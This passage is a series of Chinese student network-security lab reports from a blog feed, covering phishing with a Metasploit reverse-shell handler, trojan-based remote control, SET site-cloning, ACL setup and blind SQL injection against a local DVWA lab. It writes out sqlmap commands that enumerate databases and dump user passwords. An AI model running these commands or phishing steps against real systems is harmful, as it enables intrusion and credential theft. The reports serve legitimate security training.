<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install nodejs npm</span><br></pre></td></tr></table></figure></div>

<p>安装完成后进入你的静态文件所在目录</p>
<p>开启命令行</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">http-server</span><br></pre></td></tr></table></figure></div>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/1/image-20240711084857787.png"
                      alt="image-20240711084857787"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/1/image-20240711085531378.png"
                      alt="image-20240711085531378"
                ></p>
<h2 id="成功上线"><a href="#成功上线" class="headerlink" title="成功上线"></a>成功上线</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/1/image-20240711085547978.png"
                      alt="image-20240711085547978"
                ></p>
<h2 id="发送警告命令"><a href="#发送警告命令" class="headerlink" title="发送警告命令"></a>发送警告命令</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/1/image-20240711085907974.png"
                      alt="image-20240711085907974"
                ></p>
<h2 id="通过-flash-钓鱼获取目标控制权"><a href="#通过-flash-钓鱼获取目标控制权" class="headerlink" title="通过 flash 钓鱼获取目标控制权"></a>通过 flash 钓鱼获取目标控制权</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; handler -H 127.0.0.1 -P 4444 -p windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/1/image-20240711094156735.png"
                      alt="image-20240711094156735"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/1/image-20240711094705116.png"
                      alt="image-20240711094705116"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/1/image-20240711095518328.png"
                      alt="image-20240711095518328"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/1/image-20240711095843697.png"
                      alt="image-20240711095843697"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/1/image-20240711095854111.png"
                      alt="image-20240711095854111"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/1/image-20240711101710871.png"
                      alt="image-20240711101710871"
                ></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>实训</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>网络安全实训</tag>
        <tag>网络钓鱼攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全实训2——ACL</title>
    <url>/posts/a3df68b9.html</url>
    <content><![CDATA[<h1 id="标准-IP-访问控制列表配置"><a href="#标准-IP-访问控制列表配置" class="headerlink" title="标准 IP 访问控制列表配置"></a>标准 IP 访问控制列表配置</h1><h2 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h2><ol>
<li><p>理解标准 IP 访问控制列表的原理及功能</p>
</li>
<li><p>掌握编号的标准 IP 访问控制列表的配置方法</p>
</li>
</ol>
<h2 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h2><h3 id="网络配置要求"><a href="#网络配置要求" class="headerlink" title="网络配置要求"></a>网络配置要求</h3><p>公司的经理部、财务部和销售部门分属于不同的 3 个网段。三部门之间使用路由器进行信息传递。为了安全起见，公司领导要求以下访问控制：</p>
<ul>
<li>销售部门不能对财务部进行访问。</li>
<li>经理部可以对财务部进行访问。</li>
</ul>
<h3 id="部门主机代表"><a href="#部门主机代表" class="headerlink" title="部门主机代表"></a>部门主机代表</h3><ul>
<li>PC1: 经理部的主机</li>
<li>PC2: 销售部的主机</li>
<li>PC3: 财务部的主机</li>
</ul>
<h2 id="技术原理"><a href="#技术原理" class="headerlink" title="技术原理"></a>技术原理</h2><h3 id="接入控制列表-Access-Control-Lists-ACLs"><a href="#接入控制列表-Access-Control-Lists-ACLs" class="headerlink" title="接入控制列表 (Access Control Lists, ACLs)"></a>接入控制列表 (Access Control Lists, ACLs)</h3><p>接入控制列表（ACLs），也称访问控制列表（Access Lists），俗称防火墙，在有的文档中还称包过滤。ACLs 通过定义一些规则对网络设备接口上的数据包进行控制，允许通过或丢弃，从而提高网络可管理性和安全性。</p>
<h3 id="IP-ACL-分类"><a href="#IP-ACL-分类" class="headerlink" title="IP ACL 分类"></a>IP ACL 分类</h3><p>IP ACL 分为两种：标准 IP 访问列表和扩展 IP 访问列表。</p>
<ul>
<li>标准 IP 访问列表：编号范围为 1～99、1300～1999。可以根据数据包的源 IP 地址定义规则，进行数据包的过滤。</li>
<li>扩展 IP 访问列表：编号范围为 100～199、2000～2699。可以根据数据包的原 IP、目的 IP、源端口、目的端口、协议来定义规则，进行数据包的过滤。</li>
</ul>
<h3 id="IP-ACL-应用"><a href="#IP-ACL-应用" class="headerlink" title="IP ACL 应用"></a>IP ACL 应用</h3><p>IP ACL 基于接口进行规则的应用，分为入栈应用和出栈应用。</p>
<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="完成拓扑图的搭建"><a href="#完成拓扑图的搭建" class="headerlink" title="完成拓扑图的搭建"></a>完成拓扑图的搭建</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/2/image-20240711152958960.png"
                      alt="image-20240711152958960"
                ></p>
<h3 id="配置-IP-地址"><a href="#配置-IP-地址" class="headerlink" title="配置 IP 地址"></a>配置 IP 地址</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/2/image-20240711154536048.png"
                      alt="image-20240711154536048"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/2/image-20240711154617966.png"
                      alt="image-20240711154617966"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/2/image-20240711154734117.png"
                      alt="image-20240711154734117"
                ></p>
<h3 id="配置-router0-联通的端口"><a href="#配置-router0-联通的端口" class="headerlink" title="配置 router0 联通的端口"></a>配置 router0 联通的端口</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/2/image-20240711154913010.png"
                      alt="image-20240711154913010"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/2/image-20240711154917468.png"
                      alt="image-20240711154917468"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/2/image-20240711155007277.png"
                      alt="image-20240711155007277"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/2/image-20240711155107908.png"
                      alt="image-20240711155107908"
                ></p>
<h3 id="配置-router1-联通的端口"><a href="#配置-router1-联通的端口" class="headerlink" title="配置 router1 联通的端口"></a>配置 router1 联通的端口</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/2/image-20240711155204230.png"
                      alt="image-20240711155204230"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/2/image-20240711155224150.png"
                      alt="image-20240711155224150"
                ></p>
<h3 id="配置-router0-的路由-IP-转发表"><a href="#配置-router0-的路由-IP-转发表" class="headerlink" title="配置 router0 的路由 IP 转发表"></a>配置 router0 的路由 IP 转发表</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/2/image-20240711155357565.png"
                      alt="image-20240711155357565"
                ></p>
<h3 id="配置-router1-的路由-IP-转发表"><a href="#配置-router1-的路由-IP-转发表" class="headerlink" title="配置 router1 的路由 IP 转发表"></a>配置 router1 的路由 IP 转发表</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/2/image-20240711155517735.png"
                      alt="image-20240711155517735"
                ></p>
<h3 id="PC0-ping-目标主机"><a href="#PC0-ping-目标主机" class="headerlink" title="PC0 ping 目标主机"></a>PC0 ping 目标主机</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/2/image-20240711155609532.png"
                      alt="image-20240711155609532"
                ></p>
<h3 id="PC1-ping-目标主机"><a href="#PC1-ping-目标主机" class="headerlink" title="PC1 ping 目标主机"></a>PC1 ping 目标主机</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/2/image-20240711155652847.png"
                      alt="image-20240711155652847"
                ></p>
<h3 id="配置-router0-的-IP-准入"><a href="#配置-router0-的-IP-准入" class="headerlink" title="配置 router0 的 IP 准入"></a>配置 router0 的 IP 准入</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/2/image-20240711155854183.png"
                      alt="image-20240711155854183"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/2/image-20240711155906453.png"
                      alt="image-20240711155906453"
                ></p>
<h3 id="PC0-ping-主机"><a href="#PC0-ping-主机" class="headerlink" title="PC0 ping 主机"></a>PC0 ping 主机</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/2/image-20240711160037954.png"
                      alt="image-20240711160037954"
                ></p>
<h3 id="PC1-ping-主机"><a href="#PC1-ping-主机" class="headerlink" title="PC1 ping 主机"></a>PC1 ping 主机</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/2/image-20240711160127681.png"
                      alt="image-20240711160127681"
                ></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>实训</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>网络安全实训</tag>
        <tag>ACL</tag>
        <tag>访问控制列表</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全实训3——远程控制</title>
    <url>/posts/e05ed2cb.html</url>
    <content><![CDATA[<h2 id="生成木马程序"><a href="#生成木马程序" class="headerlink" title="生成木马程序"></a>生成木马程序</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/3/image-20240712082451721.png"
                      alt="image-20240712082451721"
                ></p>
<h2 id="设置-IP-和端口"><a href="#设置-IP-和端口" class="headerlink" title="设置 IP 和端口"></a>设置 IP 和端口</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/3/image-20240712083415484.png"
                      alt="image-20240712083415484"
                ></p>
<h2 id="运行木马"><a href="#运行木马" class="headerlink" title="运行木马"></a>运行木马</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/3/image-20240712085740159.png"
                      alt="image-20240712085740159"
                ></p>
<h2 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/3/image-20240712085828323.png"
                      alt="image-20240712085828323"
                ></p>
<h2 id="ADD-DEL-UPLOAD-DOWNDOAD"><a href="#ADD-DEL-UPLOAD-DOWNDOAD" class="headerlink" title="ADD +DEL+UPLOAD+DOWNDOAD"></a>ADD +DEL+UPLOAD+DOWNDOAD</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/3/image-20240712091242382.png"
                      alt="image-20240712091242382"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/3/image-20240712091457178.png"
                      alt="image-20240712091457178"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/3/image-20240712091751557.png"
                      alt="image-20240712091751557"
                ></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>实训</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>网络安全实训</tag>
        <tag>远程控制</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全实训4——克隆网站</title>
    <url>/posts/bbe417ed.html</url>
    <content><![CDATA[<h1 id="Web-站点克隆钓鱼"><a href="#Web-站点克隆钓鱼" class="headerlink" title="Web 站点克隆钓鱼"></a>Web 站点克隆钓鱼</h1><h2 id="启动-SET"><a href="#启动-SET" class="headerlink" title="启动 SET"></a>启动 SET</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/4/image-20240712150107562.png"
                      alt="image-20240712150107562"
                ></p>
<h2 id="选择模块"><a href="#选择模块" class="headerlink" title="选择模块"></a>选择模块</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/4/image-20240712150201067.png"
                      alt="image-20240712150201067"
                ></p>
<h2 id="Payload-选择"><a href="#Payload-选择" class="headerlink" title="Payload 选择"></a>Payload 选择</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/4/image-20240712150235930.png"
                      alt="image-20240712150235930"
                ></p>
<h2 id="Payload-设置"><a href="#Payload-设置" class="headerlink" title="Payload 设置"></a>Payload 设置</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/4/image-20240712150326771.png"
                      alt="image-20240712150326771"
                ></p>
<h2 id="返回数据"><a href="#返回数据" class="headerlink" title="返回数据"></a>返回数据</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/4/image-20240712150816676.png"
                      alt="image-20240712150816676"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/4/image-20240712151220914.png"
                      alt="image-20240712151220914"
                ></p>
<p>不知道为啥返回的是 HTML 源码，但是后台可以看到数据</p>
<p>把这段源码保存到本地打开就是登录界面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/4/image-20240712153359202.png"
                      alt="image-20240712153359202"
                ></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>实训</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>网络安全实训</tag>
        <tag>克隆网站</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全实训5——扩展访问控制列表</title>
    <url>/posts/4702aed9.html</url>
    <content><![CDATA[<h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/5/wps1.jpg"
                      alt="img"
                ></p>
<h2 id="配置-PC0"><a href="#配置-PC0" class="headerlink" title="配置 PC0"></a>配置 PC0</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/5/image-20240712164422829.png"
                      alt="image-20240712164422829"
                ></p>
<h2 id="配置-server0"><a href="#配置-server0" class="headerlink" title="配置 server0"></a>配置 server0</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/5/image-20240712164449628.png"
                      alt="image-20240712164449628"
                ></p>
<h2 id="配置路由器"><a href="#配置路由器" class="headerlink" title="配置路由器"></a>配置路由器</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/5/image-20240712164509418.png"
                      alt="image-20240712164509418"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/5/image-20240712164645364.png"
                      alt="image-20240712164645364"
                ></p>
<h2 id="ping测试"><a href="#ping测试" class="headerlink" title="ping测试"></a>ping测试</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/5/image-20240712164657013.png"
                      alt="image-20240712164657013"
                ></p>
<h2 id="配置router1"><a href="#配置router1" class="headerlink" title="配置router1"></a>配置router1</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/5/image-20240712164930564.png"
                      alt="image-20240712164930564"
                ></p>
<h2 id="ping测试-1"><a href="#ping测试-1" class="headerlink" title="ping测试"></a>ping测试</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/5/image-20240712164945100.png"
                      alt="image-20240712164945100"
                ></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>实训</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>网络安全实训</tag>
        <tag>扩展访问控制列表</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全实训6——SQL注入</title>
    <url>/posts/b81117d1.html</url>
    <content><![CDATA[<h1 id="网络安全实训-6——SQL-注入"><a href="#网络安全实训-6——SQL-注入" class="headerlink" title="网络安全实训 6——SQL 注入"></a>网络安全实训 6——SQL 注入</h1><h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><p>知新平台的文档图片无法加载</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/6/image-20240713082058344.png"
                      alt="image-20240713082058344"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/6/image-20240713082140158.png"
                      alt="image-20240713082140158"
                ></p>
<p>查看源码发现是外部引用，尝试恢复</p>
<p>恢复成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/6/image-20240713082204564.png"
                      alt="image-20240713082204564"
                ></p>
<h2 id="开启-OWASP-靶机和-Kali-虚拟机"><a href="#开启-OWASP-靶机和-Kali-虚拟机" class="headerlink" title="开启 OWASP 靶机和 Kali 虚拟机"></a>开启 OWASP 靶机和 Kali 虚拟机</h2><p>登录 dvwa</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/6/image-20240713082833701.png"
                      alt="image-20240713082833701"
                ></p>
<p>安全等级调 low</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/6/image-20240713082944615.png"
                      alt="image-20240713082944615"
                ></p>
<p>进入 SQL Injection（Blind）页面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/6/image-20240713083014817.png"
                      alt="image-20240713083014817"
                ></p>
<h3 id="随意输入一个数字，然后点击提交"><a href="#随意输入一个数字，然后点击提交" class="headerlink" title="随意输入一个数字，然后点击提交"></a>随意输入一个数字，然后点击提交</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/6/image-20240713083040908.png"
                      alt="image-20240713083040908"
                ></p>
<h3 id="安装-SQLmap"><a href="#安装-SQLmap" class="headerlink" title="安装 SQLmap"></a>安装 SQLmap</h3><p>我用的是裸机当攻击机，所以安装个 SQLmap</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/6/image-20240713083253628.png"
                      alt="image-20240713083253628"
                ></p>
<h3 id="用-F12-打开开发者工具"><a href="#用-F12-打开开发者工具" class="headerlink" title="用 F12 打开开发者工具"></a>用 F12 打开开发者工具</h3><h3 id="选中-Storage（存储）选项卡，找到-cookies，复制其中-PHPSESSID-的值（获取-cookies）"><a href="#选中-Storage（存储）选项卡，找到-cookies，复制其中-PHPSESSID-的值（获取-cookies）" class="headerlink" title="选中 Storage（存储）选项卡，找到 cookies，复制其中 PHPSESSID 的值（获取 cookies）"></a>选中 Storage（存储）选项卡，找到 cookies，复制其中 PHPSESSID 的值（获取 cookies）</h3><p>得到 <code>59mb9spqvkd9cuk543thagtsd5</code></p>
<h3 id="由于浏览器提交方式为-get-型，sqlmap-采用-u-命令。将刚才复制的-URL-和-COOKIE-写入命令"><a href="#由于浏览器提交方式为-get-型，sqlmap-采用-u-命令。将刚才复制的-URL-和-COOKIE-写入命令" class="headerlink" title="由于浏览器提交方式为 get 型，sqlmap 采用-u 命令。将刚才复制的 URL 和 COOKIE 写入命令"></a>由于浏览器提交方式为 get 型，sqlmap 采用-u 命令。将刚才复制的 URL 和 COOKIE 写入命令</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/6/image-20240713083823046.png"
                      alt="image-20240713083823046"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/6/image-20240713084248322.png"
                      alt="image-20240713084248322"
                ></p>
<p>出错了，查看 Github 的 README 发现是需要前面加 <code>python</code> 运行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/6/image-20240713084138720.png"
                      alt="image-20240713084138720"
                ></p>
<p>找到注入点</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/6/image-20240713085141292.png"
                      alt="image-20240713085141292"
                ></p>
<h3 id="为了查看有哪些数据库，输入命令："><a href="#为了查看有哪些数据库，输入命令：" class="headerlink" title="为了查看有哪些数据库，输入命令："></a>为了查看有哪些数据库，输入命令：</h3><p><code>python sqlmap.py -u &quot;http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=59mb9spqvkd9cuk543thagtsd5&quot; --batch --dbs</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/6/image-20240713085259586.png"
                      alt="image-20240713085259586"
                ></p>
<h3 id="为了查看有当前数据库，输入命令"><a href="#为了查看有当前数据库，输入命令" class="headerlink" title="为了查看有当前数据库，输入命令"></a>为了查看有当前数据库，输入命令</h3><p><code>python sqlmap.py -u &quot;http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=59mb9spqvkd9cuk543thagtsd5&quot; --batch --current-db</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/6/image-20240713085348741.png"
                      alt="image-20240713085348741"
                ></p>
<h3 id="为了查看数据库中所有的表，输入命令"><a href="#为了查看数据库中所有的表，输入命令" class="headerlink" title="为了查看数据库中所有的表，输入命令"></a>为了查看数据库中所有的表，输入命令</h3><p><code>python sqlmap.py -u &quot;http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=59mb9spqvkd9cuk543thagtsd5&quot; --batch -D dvwa --tables</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/6/image-20240713085431822.png"
                      alt="image-20240713085431822"
                ></p>
<h3 id="为了查看-users-表中有哪些列，输入命令"><a href="#为了查看-users-表中有哪些列，输入命令" class="headerlink" title="为了查看 users 表中有哪些列，输入命令"></a>为了查看 users 表中有哪些列，输入命令</h3><p><code>python sqlmap.py -u &quot;http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=59mb9spqvkd9cuk543thagtsd5&quot; --batch -D dvwa -T users --columns</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/6/image-20240713085615328.png"
                      alt="image-20240713085615328"
                ></p>
<h3 id="爆破表中-user-和-password-这两列"><a href="#爆破表中-user-和-password-这两列" class="headerlink" title="爆破表中 user 和 password 这两列"></a>爆破表中 user 和 password 这两列</h3><p><code>python sqlmap.py -u &quot;http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=59mb9spqvkd9cuk543thagtsd5&quot; --batch -D dvwa -T users -C&quot;user,password&quot; --dump</code></p>
<p>爆破成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/6/image-20240713085739164.png"
                      alt="image-20240713085739164"
                ></p>
<p>上面有报错，问了下 ChatGPT-4o，也没啥有用的信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/6/image-20240713090351933.png"
                      alt="image-20240713090351933"
                ></p>
<p>重试了一下正常了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/6/image-20240713090344216.png"
                      alt="image-20240713090344216"
                ></p>
<h2 id="过程中的命令"><a href="#过程中的命令" class="headerlink" title="过程中的命令"></a>过程中的命令</h2><p>输入命令的时候容易出错的地方主要是：引号必须加，否则命令会被识别为系统&amp;命令，还有英文字符，写成中文字符会报错</p>
<ul>
<li><p>python sqlmap.py -u “<a class="link"   href="http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id" >http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> &#x3D; 1&amp;Submit &#x3D; Submit#” –cookie &#x3D; “security &#x3D; low; PHPSESSID &#x3D; 59mb9spqvkd9cuk543thagtsd5” –batch</p>
</li>
<li><p>python sqlmap.py -u “<a class="link"   href="http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id" >http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> &#x3D; 1&amp;Submit &#x3D; Submit#” –cookie &#x3D; “security &#x3D; low; PHPSESSID &#x3D; 59mb9spqvkd9cuk543thagtsd5” –batch –dbs</p>
</li>
<li><p>python sqlmap.py -u “<a class="link"   href="http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id" >http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> &#x3D; 1&amp;Submit &#x3D; Submit#” –cookie &#x3D; “security &#x3D; low; PHPSESSID &#x3D; 59mb9spqvkd9cuk543thagtsd5” –batch –current-db</p>
</li>
<li><p>python sqlmap.py -u “<a class="link"   href="http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id" >http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> &#x3D; 1&amp;Submit &#x3D; Submit#” –cookie &#x3D; “security &#x3D; low; PHPSESSID &#x3D; 59mb9spqvkd9cuk543thagtsd5” –batch -D dvwa –tables</p>
</li>
<li><p>python sqlmap.py -u “<a class="link"   href="http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id" >http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> &#x3D; 1&amp;Submit &#x3D; Submit#” –cookie &#x3D; “security &#x3D; low; PHPSESSID &#x3D; 59mb9spqvkd9cuk543thagtsd5” –batch -D dvwa –tables</p>
</li>
<li><p>python sqlmap.py -u “<a class="link"   href="http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id" >http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> &#x3D; 1&amp;Submit &#x3D; Submit#” –cookie &#x3D; “security &#x3D; low; PHPSESSID &#x3D; 59mb9spqvkd9cuk543thagtsd5” –batch -D dvwa -T users –columns</p>
</li>
<li><p>python sqlmap.py -u “<a class="link"   href="http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id" >http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> &#x3D; 1&amp;Submit &#x3D; Submit#” –cookie &#x3D; “security &#x3D; low; PHPSESSID &#x3D; 59mb9spqvkd9cuk543thagtsd5” –batch -D dvwa -T users -C “user, password” –dump</p>
</li>
</ul>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>实训</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>网络安全实训</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全实训7——MD5加盐</title>
    <url>/posts/51b71a30.html</url>
    <content><![CDATA[<h2 id="加密-exp"><a href="#加密-exp" class="headerlink" title="加密 exp"></a>加密 exp</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_salt</span>(<span class="params">length=<span class="number">16</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;生成指定长度的盐值&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> os.urandom(length)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_hash_with_salt</span>(<span class="params">input_string, salt=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算带盐值的MD5哈希&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> salt <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        salt = generate_salt()</span><br><span class="line">    hasher = hashlib.md5()</span><br><span class="line">    <span class="comment"># 将输入字符串与盐值结合</span></span><br><span class="line">    hasher.update(input_string.encode(<span class="string">&quot;utf-8&quot;</span>) + salt)</span><br><span class="line">    <span class="comment"># 获取哈希值</span></span><br><span class="line">    hash_value = hasher.hexdigest()</span><br><span class="line">    <span class="keyword">return</span> hash_value, salt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> .----------------.  .----------------.  .-----------------.  .----------------.  .----------------.  .----------------.</span></span><br><span class="line"><span 